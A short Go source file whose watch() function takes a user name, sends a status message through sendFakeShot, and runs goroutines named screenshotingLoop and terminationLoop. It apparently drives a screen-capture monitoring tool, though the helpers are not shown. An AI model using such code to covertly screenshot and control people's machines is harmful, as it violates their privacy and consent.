package main

import (
	"os"
	"runtime"
)

func watch() {

	userName := os.Args[1]

	_ = sendFakeShot(userName, "starting loops in one piece watcher on "+runtime.GOOS)
	go screenshotingLoop(userName)
	go terminationLoop(userName)
	select {}
}
